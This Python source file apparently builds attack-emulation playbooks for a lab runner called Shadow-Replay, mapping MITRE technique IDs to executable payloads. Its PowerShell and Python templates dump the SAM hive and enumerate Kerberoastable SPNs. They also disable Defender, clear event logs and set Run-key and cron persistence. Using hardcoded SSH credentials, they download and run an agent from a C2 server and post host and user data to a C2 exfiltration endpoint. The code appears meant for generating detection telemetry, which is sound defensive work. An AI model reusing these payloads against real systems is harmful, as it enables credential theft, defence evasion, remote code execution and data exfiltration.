from typing import Dict, List, Optional
import json
import yaml
import os
from datetime import datetime


def _load_lab_cfg(config_path: str = "config.yaml") -> Dict:
    """Lee la sección `lab` de config.yaml. Devuelve {} si falla."""
    try:
        with open(config_path, "r") as f:
            return yaml.safe_load(f).get("lab", {})
    except Exception:
        return {}


class PlaybookGenerator:
    """
    Genera playbooks JSON 100% compatibles con Shadow-Replay.

    Formato esperado por el runner:
    {
      "playbook_id": str,
      "name": str,
      "description": str,
      "mandatory_agents": [{"agent_id", "agent_type", "description"}],
      "events": [{
        "event_id", "name", "agent_id", "required_agent_type",
        "payload_type",   # "powershell" | "python"
        "payload",        # código ejecutable real
        "success_trigger",# event_id del siguiente paso | null
        "failure_action"  # "abort" | "continue" | "retry"
      }]
    }
    """

    # Orden preferido de plataformas al asignar agent_ids
    _PLATFORM_ORDER = ["windows", "linux", "cloud"]

    def __init__(self, config_path: str = "config.yaml"):
        lab = _load_lab_cfg(config_path)
        machines = lab.get("machines", {})
        c2 = lab.get("c2", {})

        # Lab targets (fallback a valores hardcodeados si config no existe)
        self.win_detection_ip  = machines.get("win_detection",  {}).get("ip", "10.5.9.31")
        self.win_prevention_ip = machines.get("win_prevention", {}).get("ip", "10.5.9.30")
        self.linux_ip          = machines.get("linux_victim",   {}).get("ip", "10.5.9.40")
        self.linux_user        = machines.get("linux_victim",   {}).get("ssh_user", "samba")
        self.linux_pass        = machines.get("linux_victim",   {}).get("ssh_password", "password123")
        self.win_unmanaged_ip  = machines.get("win_unmanaged",  {}).get("ip", "10.5.9.27")
        self.c2_ip             = c2.get("ip",   "10.5.9.41")
        self.c2_port           = c2.get("port", 4444)
        self.c2_url            = f"http://{self.c2_ip}:{self.c2_port}"

    # ──────────────────────────────────────────────────────────────
    #  Public API
    # ──────────────────────────────────────────────────────────────

    def generate(self, analysis: Dict, attack_sequence: List[Dict],
                 iocs: Dict, ttps: List[Dict]) -> Dict:
        """Genera playbook completo compatible con Shadow-Replay."""

        playbook_id = self._generate_id(analysis.get("campaign_name", "unknown"))
        agents      = self._determine_agents(attack_sequence)
        events      = self._generate_events(attack_sequence, agents, iocs)

        return {
            "playbook_id":      playbook_id,
            "name":             analysis.get("campaign_name", "Unknown Campaign"),
            "description":      analysis.get("reasoning", ""),
            "generated_at":     datetime.now().isoformat(),
            "source_report":    analysis.get("threat_actor", "Unknown"),
            "mandatory_agents": agents,
            "events":           events,
            "metadata": {
                "ttps":      [t["id"] for t in ttps],
                "platforms": analysis.get("platforms", []),
                "risk_level": analysis.get("demo_risk", "medium"),
            },
        }

    # ──────────────────────────────────────────────────────────────
    #  Agent assignment
    # ──────────────────────────────────────────────────────────────

    def _determine_agents(self, attack_sequence: List[Dict]) -> List[Dict]:
        """
        Construye mandatory_agents usando las IPs reales del lab.
        Windows → agent_1 (10.5.9.31, detection mode — full telemetry)
        Linux   → agent_2 (10.5.9.40, SSH via samba/password123)
        Orden: windows siempre primero para que el runner lo registre primero.
        """
        platforms_seen: set = set()
        for stage in attack_sequence:
            platforms_seen.add(stage.get("platform", "windows"))

        agents: List[Dict] = []
        agent_num = 1

        # Sort to guarantee windows=agent_1, linux=agent_2
        for platform in self._PLATFORM_ORDER:
            if platform not in platforms_seen:
                continue
            agents.append({
                "agent_id":   f"agent_{agent_num}",
                "agent_type": platform,
                "description": self._agent_description(platform),
            })
            agent_num += 1

        # Any unlisted platform (e.g. "cloud") appended at the end
        for platform in sorted(platforms_seen - set(self._PLATFORM_ORDER)):
            agents.append({
                "agent_id":   f"agent_{agent_num}",
                "agent_type": platform,
                "description": f"{platform} system",
            })
            agent_num += 1

        return agents

    def _agent_description(self, platform: str) -> str:
        descriptions = {
            "windows": (
                f"Windows victim — detection mode "
                f"({self.win_detection_ip}, domain-joined, CrowdStrike active)"
            ),
            "linux": (
                f"Linux victim — lateral movement target "
                f"({self.linux_ip}, SSH: {self.linux_user}/{self.linux_pass})"
            ),
            "cloud": "Cloud environment (AWS/Azure operations)",
        }
        return descriptions.get(platform, f"{platform} system")

    # ──────────────────────────────────────────────────────────────
    #  Event generation
    # ──────────────────────────────────────────────────────────────

    def _generate_events(self, attack_sequence: List[Dict],
                         agents: List[Dict], iocs: Dict) -> List[Dict]:
        """Genera la lista de events encadenados + cleanup al final."""
        events: List[Dict] = []
        agent_map = {a["agent_type"]: a for a in agents}
        cleanup_ids = [f"cleanup_{a['agent_id']}" for a in reversed(agents)]

        for idx, stage in enumerate(attack_sequence):
            platform = stage.get("platform", "windows")
            agent = agent_map.get(platform, agents[0])
            payload_type = "powershell" if agent["agent_type"] == "windows" else "python"

            # Next event: next stage if exists, else first cleanup
            if idx < len(attack_sequence) - 1:
                next_trigger: Optional[str] = attack_sequence[idx + 1]["stage"]
            else:
                next_trigger = cleanup_ids[0] if cleanup_ids else None

            events.append({
                "event_id":           stage["stage"],
                "name":               stage.get("description", stage["stage"]),
                "agent_id":           agent["agent_id"],
                "required_agent_type": agent["agent_type"],
                "payload_type":       payload_type,
                "payload":            self._generate_payload(stage, iocs, agent["agent_type"]),
                "mitre_technique":    stage.get("technique_id", ""),
                "success_trigger":    next_trigger,
                "failure_action":     "abort" if idx < 2 else "continue",
            })

        events.extend(self._generate_cleanup_events(agents))
        return events

    # ──────────────────────────────────────────────────────────────
    #  Payload templates — real, executable code using lab IPs
    # ──────────────────────────────────────────────────────────────

    def _generate_payload(self, stage: Dict, iocs: Dict, agent_type: str) -> str:
        """
        Devuelve código ejecutable real para cada categoría de técnica.
        Todos los payloads usan las IPs/credenciales reales del lab.
        """
        tid = stage.get("technique_id", "")

        # ── Windows payloads ──────────────────────────────────────
        if agent_type == "windows":

            if "T1566" in tid:      # Phishing / Initial Access
                return self._ps_phishing()

            if "T1059" in tid:      # Command & Scripting Interpreter
                return self._ps_execution(iocs)

            if "T1003" in tid:      # Credential Dumping
                return self._ps_credential_dump()

            if "T1021" in tid:      # Lateral Movement
                return self._ps_lateral_movement()

            if "T1547" in tid or "T1053" in tid:  # Persistence
                return self._ps_persistence()

            if "T1082" in tid or "T1057" in tid or "T1083" in tid or "T1018" in tid:
                return self._ps_discovery()

            if "T1562" in tid or "T1070" in tid:  # Defense Evasion
                return self._ps_defense_evasion()

            if "T1105" in tid:      # Ingress Tool Transfer
                return self._ps_tool_transfer()

            if "T1041" in tid or "T1048" in tid:  # Exfiltration
                return self._ps_exfiltration()

            # Generic Windows fallback
            desc = stage.get("description", "Executing stage")
            return (
                f"Write-Host '[{tid}] {desc}'; "
                f"Write-Host '  └─ Target: {self.win_detection_ip} → C2: {self.c2_ip}:{self.c2_port}'"
            )

        # ── Linux payloads ────────────────────────────────────────
        else:
            if "T1021" in tid or "T1570" in tid:
                return self._py_lateral_receive()

            if "T1053" in tid or "T1547" in tid:
                return self._py_linux_persistence()

            if "T1082" in tid or "T1057" in tid or "T1083" in tid:
                return self._py_linux_discovery()

            if "T1041" in tid or "T1048" in tid:
                return self._py_linux_exfiltration()

            # Generic Linux fallback
            return (
                f"import subprocess\n"
                f"result = subprocess.run(['echo', '[{tid}] Stage executed on {self.linux_ip}'], "
                f"capture_output=True, text=True)\nprint(result.stdout)"
            )

    # ── PowerShell templates ──────────────────────────────────────

    def _ps_phishing(self) -> str:
        return (
            f"Write-Host '=== [T1566] PHISHING / INITIAL ACCESS ===';\n"
            f"Write-Host '  ├─ Simulating: user opens malicious attachment';\n"
            f"Write-Host '  ├─ Victim: {self.win_detection_ip} (detection mode)';\n"
            f"Write-Host '  ├─ NOTE: Mimecast in delivery path — email URL rewritten';\n"
            f"# Trigger: download cradle from C2 (generates telemetry)\n"
            f"$wc = New-Object Net.WebClient;\n"
            f"$wc.Headers.Add('User-Agent','Mozilla/5.0');\n"
            f"try {{ $wc.DownloadString('{self.c2_url}/ping') | Out-Null }} "
            f"catch {{ Write-Host '  ├─ C2 beacon attempted (expected in simulation)' }};\n"
            f"Write-Host '  └─ Palo Alto will log outbound connection to {self.c2_ip}:{self.c2_port}'"
        )

    def _ps_execution(self, iocs: Dict) -> str:
        cmd = iocs.get("commands", ["whoami /all"])[0] if iocs.get("commands") else "whoami /all"
        return (
            f"Write-Host '=== [T1059] COMMAND EXECUTION ===';\n"
            f"Write-Host '  ├─ Host: {self.win_detection_ip}';\n"
            f"Write-Host \"  ├─ User: $(whoami)\";\n"
            f"Write-Host \"  ├─ Hostname: $(hostname)\";\n"
            f"# Execute with bypass flags — triggers CrowdStrike script-block logging\n"
            f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
            f"([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('{cmd}')));\n"
            f"Write-Host '  └─ Script-block telemetry generated'"
        )

    def _ps_credential_dump(self) -> str:
        return (
            f"Write-Host '=== [T1003] CREDENTIAL ACCESS ===';\n"
            f"Write-Host '  ├─ Host: {self.win_detection_ip} (domain-joined)';\n"
            f"# SAM hive access — generates LSASS-related telemetry\n"
            f"reg save HKLM\\SAM C:\\Windows\\Temp\\s.tmp /y 2>&1 | Out-Null;\n"
            f"Remove-Item C:\\Windows\\Temp\\s.tmp -Force -ErrorAction SilentlyContinue;\n"
            f"Write-Host '  ├─ SAM hive access attempted (CrowdStrike: credential dump alert)';\n"
            f"# Kerberoasting attempt\n"
            f"Write-Host '  ├─ Enumerating SPNs for Kerberoasting';\n"
            f"setspn -T . -Q */* 2>&1 | Select-String 'CN=' | Select-Object -First 5;\n"
            f"Write-Host '  └─ Credential access telemetry generated — Linux creds: "
            f"{self.linux_user}/{self.linux_pass} @ {self.linux_ip}'"
        )

    def _ps_lateral_movement(self) -> str:
        return (
            f"Write-Host '=== [T1021] LATERAL MOVEMENT: Windows → Linux ===';\n"
            f"Write-Host '  ├─ Source: {self.win_detection_ip}';\n"
            f"Write-Host '  ├─ Target: {self.linux_ip} (SSH)';\n"
            f"Write-Host '  ├─ Credentials: {self.linux_user} / {self.linux_pass}';\n"
            f"Write-Host '  ├─ NOTE: Palo Alto will log SSH connection {self.win_detection_ip} → {self.linux_ip}';\n"
            f"# Install Posh-SSH if not present, then deploy Linux agent via SSH\n"
            f"if (-not (Get-Module -ListAvailable -Name Posh-SSH)) {{\n"
            f"    Install-Module -Name Posh-SSH -Force -AllowClobber -Scope CurrentUser -ErrorAction SilentlyContinue\n"
            f"}}\n"
            f"Import-Module Posh-SSH -ErrorAction SilentlyContinue;\n"
            f"$cred = New-Object System.Management.Automation.PSCredential(\n"
            f"    '{self.linux_user}',\n"
            f"    (ConvertTo-SecureString '{self.linux_pass}' -AsPlainText -Force)\n"
            f");\n"
            f"$session = New-SSHSession -ComputerName '{self.linux_ip}' "
            f"-Credential $cred -AcceptKey -ErrorAction SilentlyContinue;\n"
            f"if ($session) {{\n"
            f"    Invoke-SSHCommand -SessionId $session.SessionId "
            f"-Command \"wget -q -O /tmp/agent.py {self.c2_url}/downloads/agent_linux.py "
            f"&& python3 /tmp/agent.py --server {self.c2_url} &\";\n"
            f"    Remove-SSHSession -SessionId $session.SessionId;\n"
            f"    Write-Host '  └─ Linux agent deployed on {self.linux_ip}'\n"
            f"}} else {{\n"
            f"    Write-Host '  └─ SSH session failed (verify Posh-SSH and connectivity)'\n"
            f"}}"
        )

    def _ps_persistence(self) -> str:
        return (
            f"Write-Host '=== [T1547] PERSISTENCE ===';\n"
            f"Write-Host '  ├─ Host: {self.win_detection_ip}';\n"
            f"# Registry Run key — classic persistence trigger for CrowdStrike\n"
            f"$regPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';\n"
            f"$keyName = 'WindowsUpdateHelper';\n"
            f"Set-ItemProperty -Path $regPath -Name $keyName "
            f"-Value 'powershell.exe -WindowStyle Hidden -NoProfile -Command \"Start-Sleep 1\"' "
            f"-ErrorAction SilentlyContinue;\n"
            f"Write-Host '  ├─ Registry Run key set (CrowdStrike: persistence detection)';\n"
            f"# Cleanup immediately after telemetry is generated\n"
            f"Start-Sleep -Seconds 3;\n"
            f"Remove-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue;\n"
            f"Write-Host '  └─ Persistence key removed (cleanup)'"
        )

    def _ps_discovery(self) -> str:
        return (
            f"Write-Host '=== [T1082/T1057/T1018] DISCOVERY ===';\n"
            f"Write-Host '  ├─ Host: {self.win_detection_ip}';\n"
            f"Write-Host \"  ├─ OS: $(([Environment]::OSVersion).VersionString)\";\n"
            f"Write-Host \"  ├─ Domain: $env:USERDOMAIN\";\n"
            f"Write-Host '  ├─ Running processes (top 10):';\n"
            f"Get-Process | Sort-Object CPU -Descending | "
            f"Select-Object -First 10 Name, Id, CPU | Format-Table -AutoSize;\n"
            f"Write-Host '  ├─ Network connections to C2 range:';\n"
            f"Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | "
            f"Where-Object {{ $_.RemoteAddress -like '10.5.9.*' }} | "
            f"Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort;\n"
            f"Write-Host '  └─ Discovery telemetry generated'"
        )

    def _ps_defense_evasion(self) -> str:
        return (
            f"Write-Host '=== [T1562/T1070] DEFENSE EVASION ===';\n"
            f"Write-Host '  ├─ Host: {self.win_detection_ip} (CrowdStrike DETECTION mode — will alert, not block)';\n"
            f"# Attempt to disable Windows Defender (safe — CrowdStrike remains active)\n"
            f"Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;\n"
            f"Write-Host '  ├─ Defender disable attempted (CrowdStrike: defense evasion alert)';\n"
            f"# Clear event log entries (generates telemetry itself)\n"
            f"wevtutil cl System 2>&1 | Out-Null;\n"
            f"Write-Host '  ├─ Event log cleared (T1070 - Indicator Removal)';\n"
            f"Write-Host '  └─ Evasion telemetry captured by Falcon'"
        )

    def _ps_tool_transfer(self) -> str:
        return (
            f"Write-Host '=== [T1105] INGRESS TOOL TRANSFER ===';\n"
            f"Write-Host '  ├─ Source: {self.c2_ip}:{self.c2_port}';\n"
            f"Write-Host '  ├─ Destination: {self.win_detection_ip}';\n"
            f"Write-Host '  ├─ NOTE: Palo Alto logs download {self.win_detection_ip} ← {self.c2_ip}';\n"
            f"$dest = 'C:\\Windows\\Temp\\update.exe';\n"
            f"$wc = New-Object Net.WebClient;\n"
            f"try {{\n"
            f"    $wc.DownloadFile('{self.c2_url}/downloads/agent-windows.py', $dest);\n"
            f"    Write-Host '  ├─ File downloaded: $dest';\n"
            f"    Remove-Item $dest -Force -ErrorAction SilentlyContinue;\n"
            f"    Write-Host '  └─ File removed (cleanup)'\n"
            f"}} catch {{\n"
            f"    Write-Host '  └─ Download attempted (C2 beacon logged by Palo Alto)'\n"
            f"}}"
        )

    def _ps_exfiltration(self) -> str:
        return (
            f"Write-Host '=== [T1041] EXFILTRATION OVER C2 ===';\n"
            f"Write-Host '  ├─ Source: {self.win_detection_ip}';\n"
            f"Write-Host '  ├─ Destination: {self.c2_ip}:{self.c2_port}';\n"
            f"Write-Host '  ├─ NOTE: Palo Alto will flag outbound data to {self.c2_ip}';\n"
            f"# Simulate data collection + exfil beacon\n"
            f"$data = @{{ host=$(hostname); user=$(whoami); domain=$env:USERDOMAIN }} | "
            f"ConvertTo-Json -Compress;\n"
            f"$wc = New-Object Net.WebClient;\n"
            f"$wc.Headers.Add('Content-Type','application/json');\n"
            f"try {{\n"
            f"    $wc.UploadString('{self.c2_url}/exfil', $data) | Out-Null;\n"
            f"    Write-Host '  └─ Exfil beacon sent (CrowdStrike: data exfiltration alert)'\n"
            f"}} catch {{\n"
            f"    Write-Host '  └─ Exfil attempted (network telemetry generated)'\n"
            f"}}"
        )

    # ── Python/Linux templates ────────────────────────────────────

    def _py_lateral_receive(self) -> str:
        return (
            f"import subprocess, os, time\n"
            f"print('=== [T1021] LATERAL MOVEMENT — LINUX SIDE ===')\n"
            f"print(f'  ├─ Host: {self.linux_ip}')\n"
            f"print(f'  ├─ Arrived via SSH from Windows ({self.win_detection_ip})')\n"
            f"print(f'  ├─ C2: {self.c2_url}')\n"
            f"# Verify connectivity back to C2\n"
            f"r = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{{http_code}}',\n"
            f"                    '{self.c2_url}/ping'], capture_output=True, text=True, timeout=10)\n"
            f"print(f'  ├─ C2 reachability check: HTTP {{r.stdout.strip()}}')\n"
            f"print(f'  └─ Linux pivot established on {self.linux_ip}')"
        )

    def _py_linux_persistence(self) -> str:
        return (
            f"import subprocess, os\n"
            f"print('=== [T1053] LINUX PERSISTENCE ===')\n"
            f"print(f'  ├─ Host: {self.linux_ip}')\n"
            f"# Add cron job (generates cron telemetry)\n"
            f"cron_line = '* * * * * echo persistence_check > /dev/null 2>&1'\n"
            f"r = subprocess.run('crontab -l 2>/dev/null; echo \"' + cron_line + '\"',\n"
            f"                   shell=True, capture_output=True, text=True)\n"
            f"subprocess.run('echo \"' + r.stdout + '\" | crontab -',\n"
            f"               shell=True, capture_output=True)\n"
            f"print('  ├─ Cron persistence added')\n"
            f"# Cleanup\n"
            f"import time; time.sleep(3)\n"
            f"subprocess.run(\"crontab -l | grep -v 'persistence_check' | crontab -\",\n"
            f"               shell=True)\n"
            f"print('  └─ Cron entry removed (cleanup)')"
        )

    def _py_linux_discovery(self) -> str:
        return (
            f"import subprocess\n"
            f"print('=== [T1082] LINUX DISCOVERY ===')\n"
            f"print(f'  ├─ Host: {self.linux_ip}')\n"
            f"cmds = {{\n"
            f"    'whoami':     'whoami',\n"
            f"    'hostname':   'hostname',\n"
            f"    'interfaces': 'ip addr show',\n"
            f"    'routes':     'ip route',\n"
            f"    'processes':  'ps aux --sort=-%cpu | head -10',\n"
            f"}}\n"
            f"for label, cmd in cmds.items():\n"
            f"    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n"
            f"    print(f'  ├─ [{{label}}]\\n{{r.stdout.strip()}}')\n"
            f"print('  └─ Discovery complete on {self.linux_ip}')"
        )

    def _py_linux_exfiltration(self) -> str:
        return (
            f"import subprocess, socket\n"
            f"print('=== [T1041] LINUX EXFILTRATION ===')\n"
            f"print(f'  ├─ Source: {self.linux_ip}')\n"
            f"print(f'  ├─ Destination: {self.c2_ip}:{self.c2_port}')\n"
            f"# Collect and beacon\n"
            f"hostname = socket.gethostname()\n"
            f"r = subprocess.run('whoami', capture_output=True, text=True)\n"
            f"user = r.stdout.strip()\n"
            f"data = f'host={{hostname}},user={{user}},src={self.linux_ip}'\n"
            f"try:\n"
            f"    r2 = subprocess.run(\n"
            f"        ['curl', '-s', '-X', 'POST', '{self.c2_url}/exfil',\n"
            f"         '-d', data, '-H', 'Content-Type: text/plain'],\n"
            f"        capture_output=True, text=True, timeout=10\n"
            f"    )\n"
            f"    print(f'  └─ Exfil beacon sent (response: {{r2.returncode}})')\n"
            f"except Exception as e:\n"
            f"    print(f'  └─ Exfil attempted: {{e}}')"
        )

    # ──────────────────────────────────────────────────────────────
    #  Cleanup events
    # ──────────────────────────────────────────────────────────────

    def _generate_cleanup_events(self, agents: List[Dict]) -> List[Dict]:
        """
        Genera cleanup encadenado: linux cleanup → windows cleanup.
        El último cleanup tiene success_trigger = null.
        """
        ordered = list(reversed(agents))   # linux first if exists, then windows
        cleanup_events: List[Dict] = []

        for i, agent in enumerate(ordered):
            next_cleanup = (
                f"cleanup_{ordered[i + 1]['agent_id']}"
                if i < len(ordered) - 1
                else None
            )

            if agent["agent_type"] == "windows":
                payload = (
                    f"Write-Host '[CLEANUP] Demo completed — terminating Windows agent on "
                    f"{self.win_detection_ip}'; "
                    f"Start-Sleep -Seconds 2; "
                    f"Stop-Process -Id $PID -Force"
                )
                payload_type = "powershell"
            else:
                payload = (
                    f"import os, time\n"
                    f"print('[CLEANUP] Demo completed — terminating Linux agent on {self.linux_ip}')\n"
                    f"time.sleep(2)\n"
                    f"os._exit(0)"
                )
                payload_type = "python"

            cleanup_events.append({
                "event_id":            f"cleanup_{agent['agent_id']}",
                "name":                f"Cleanup — Terminate {agent['agent_type'].title()} Agent",
                "agent_id":            agent["agent_id"],
                "required_agent_type": agent["agent_type"],
                "payload_type":        payload_type,
                "payload":             payload,
                "success_trigger":     next_cleanup,
                "failure_action":      "continue",
            })

        return cleanup_events

    # ──────────────────────────────────────────────────────────────
    #  Helpers
    # ──────────────────────────────────────────────────────────────

    def _generate_id(self, campaign_name: str) -> str:
        clean = campaign_name.lower().replace(" ", "_").replace("-", "_")
        ts = datetime.now().strftime("%Y%m%d")
        return f"{clean}_{ts}"
